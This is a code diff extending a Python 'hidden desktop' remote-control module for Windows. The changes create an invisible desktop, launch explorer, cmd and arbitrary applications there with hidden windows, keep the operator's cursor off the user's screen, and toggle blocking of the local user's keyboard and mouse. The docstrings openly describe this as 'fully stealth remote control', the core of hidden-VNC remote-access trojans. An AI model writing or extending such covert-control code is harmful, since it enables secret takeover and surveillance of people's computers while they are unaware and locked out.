@@ -622,83 +622,276 @@ class HiddenDesktopInputController:
 
 
 class HiddenDesktopSession:
-    def __init__(self) -> None:
+    """
+    Hidden Desktop session for fully stealth remote control.
+    
+    Features:
+    - Creates a separate Windows desktop invisible to the user
+    - Operator cursor is NOT visible on client's screen (asynchronous cursors)
+    - Screen capture from hidden desktop only
+    - Toggleable local input blocking
+    - Stealth application launching
+    
+    Environment variables:
+    - RC_BLOCK_LOCAL_INPUT: Set to "1" to auto-block local input on start
+    - RC_HIDDEN_DESKTOP_FPS: Frame rate for capture (default: 30)
+    """
+    
+    def __init__(self, auto_block_input: bool | None = None) -> None:
+        """
+        Initialize hidden desktop session.
+        
+        Args:
+            auto_block_input: Override for automatic input blocking.
+                              If None, uses RC_BLOCK_LOCAL_INPUT env var.
+        """
         if platform.system() != "Windows":
             raise RuntimeError("Hidden desktop is only supported on Windows.")
+        
         self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
         self._desktop_handle = _create_desktop(self._desktop_name)
         self._desktop_path = f"WinSta0\\{self._desktop_name}"
         self._processes: list[subprocess.Popen] = []
         self._input_blocked = False
-        self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
-            "1",
-            "true",
-            "yes",
-            "on",
-        }
+        self._input_block_enabled = False
+        
+        # Determine if input blocking should be enabled
+        if auto_block_input is not None:
+            self._block_local_input = bool(auto_block_input)
+        else:
+            self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
+                "1", "true", "yes", "on",
+            }
+        
+        # Get FPS from environment
+        fps = 30
+        try:
+            fps = int(os.getenv("RC_HIDDEN_DESKTOP_FPS", "30"))
+            fps = max(1, min(60, fps))
+        except (TypeError, ValueError):
+            fps = 30
+        
         self._start_shell()
 
+        # Capture WITHOUT cursor drawing - operator cursor stays invisible to client
         self._capture = HiddenDesktopCapture(
             self._desktop_handle,
             desktop_path=self._desktop_path,
-            draw_cursor=False,
-            fps=30,
+            draw_cursor=False,  # Critical: operator cursor not visible to client
+            fps=fps,
         )
         size = self._capture.frame_size
         deadline = time.monotonic() + 1.0
         while size == (0, 0) and time.monotonic() < deadline:
             time.sleep(0.05)
             size = self._capture.frame_size
+        
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
+        
         if self._block_local_input:
-            self.block_local_input()
+            self.set_input_blocking(True)
+    
+    @property
+    def is_input_blocked(self) -> bool:
+        """Check if local input is currently blocked."""
+        return self._input_blocked
+    
+    @property
+    def input_blocking_enabled(self) -> bool:
+        """Check if input blocking feature is enabled."""
+        return self._input_block_enabled
+    
+    @property
+    def desktop_name(self) -> str:
+        """Get the hidden desktop name."""
+        return self._desktop_name
+    
+    @property
+    def desktop_path(self) -> str:
+        """Get the full hidden desktop path."""
+        return self._desktop_path
 
     def _start_shell(self) -> None:
+        """Start essential shell processes on hidden desktop."""
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.lpDesktop = self._desktop_path
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
+        
+        # Start explorer and cmd on hidden desktop
         for cmd in ("explorer.exe", "cmd.exe"):
             try:
-                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
+                proc = subprocess.Popen(
+                    [cmd],
+                    startupinfo=startupinfo,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                )
                 self._processes.append(proc)
+                logger.debug("Started %s on hidden desktop", cmd)
             except Exception as exc:
                 logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
 
-    def launch_application(self, app_name: str) -> None:
+    def launch_application(self, app_name: str, args: list[str] | None = None) -> subprocess.Popen:
+        """
+        Launch an application on the hidden desktop (invisible to user).
+        
+        Args:
+            app_name: Name or path of the application
+            args: Optional command line arguments
+            
+        Returns:
+            The Popen process object
+            
+        Raises:
+            FileNotFoundError: If application cannot be found
+        """
         exe = _resolve_app_executable(app_name)
         if not exe:
-            raise FileNotFoundError(app_name)
+            raise FileNotFoundError(f"Application not found: {app_name}")
+        
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.lpDesktop = self._desktop_path
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
-        proc = subprocess.Popen([exe], startupinfo=startupinfo)
+        
+        cmd = [exe]
+        if args:
+            cmd.extend(args)
+        
+        proc = subprocess.Popen(
+            cmd,
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+        )
         self._processes.append(proc)
+        logger.info("Launched %s on hidden desktop (PID: %s)", app_name, proc.pid)
+        return proc
+
+    def set_input_blocking(self, enabled: bool) -> bool:
+        """
+        Toggle local input blocking.
+        
+        This is a switchable module - you can enable/disable it at runtime.
+        When enabled, the local user cannot use mouse/keyboard.
+        
+        Args:
+            enabled: True to block local input, False to unblock
+            
+        Returns:
+            True if the operation succeeded
+        """
+        self._input_block_enabled = bool(enabled)
+        
+        if enabled:
+            return self.block_local_input()
+        else:
+            self.unblock_local_input()
+            return True
 
     def block_local_input(self) -> bool:
+        """
+        Block local mouse and keyboard input.
+        
+        Note: Requires administrator privileges on Windows.
+        
+        Returns:
+            True if input was successfully blocked
+        """
         if self._input_blocked:
             return True
         self._input_blocked = _toggle_block_input(True)
         if not self._input_blocked:
-            logger.warning("Hidden desktop: failed to block local input.")
+            logger.warning("Hidden desktop: failed to block local input (admin required?).")
+        else:
+            logger.info("Hidden desktop: local input blocked")
         return self._input_blocked
 
     def unblock_local_input(self) -> None:
+        """Unblock local mouse and keyboard input."""
         if self._input_blocked:
             _toggle_block_input(False)
             self._input_blocked = False
+            logger.info("Hidden desktop: local input unblocked")
 
-    def close(self) -> None:
-        self.screen_track.stop()
-        self.input_controller.close()
-        self.unblock_local_input()
+    def get_running_processes(self) -> list[tuple[int, str]]:
+        """
+        Get list of processes running on the hidden desktop.
+        
+        Returns:
+            List of (pid, status) tuples
+        """
+        result = []
         for proc in self._processes:
             try:
-                proc.terminate()
+                status = "running" if proc.poll() is None else "terminated"
+                result.append((proc.pid, status))
             except Exception:
-                pass
+                result.append((0, "unknown"))
+        return result
+
+    def terminate_process(self, pid: int) -> bool:
+        """
+        Terminate a specific process on the hidden desktop.
+        
+        Args:
+            pid: Process ID to terminate
+            
+        Returns:
+            True if process was found and terminated
+        """
+        for proc in self._processes:
+            if proc.pid == pid:
+                try:
+                    proc.terminate()
+                    return True
+                except Exception as exc:
+                    logger.warning("Failed to terminate process %d: %s", pid, exc)
+                    return False
+        return False
+
+    def close(self) -> None:
+        """
+        Close the hidden desktop session and cleanup resources.
+        
+        This will:
+        - Stop screen capture
+        - Close input controller
+        - Unblock local input
+        - Terminate all spawned processes
+        - Close the hidden desktop
+        """
+        logger.info("Closing hidden desktop session: %s", self._desktop_name)
+        
+        # Stop media track
+        try:
+            self.screen_track.stop()
+        except Exception as exc:
+            logger.warning("Error stopping screen track: %s", exc)
+        
+        # Close input controller
+        try:
+            self.input_controller.close()
+        except Exception as exc:
+            logger.warning("Error closing input controller: %s", exc)
+        
+        # Always unblock input on close
+        self.unblock_local_input()
+        
+        # Terminate all processes
+        for proc in self._processes:
+            try:
+                if proc.poll() is None:
+                    proc.terminate()
+                    proc.wait(timeout=2.0)
+            except Exception:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
         self._processes.clear()
+        
+        # Close the desktop
         _close_desktop(self._desktop_handle)
         self._desktop_handle = None
+        logger.info("Hidden desktop session closed")
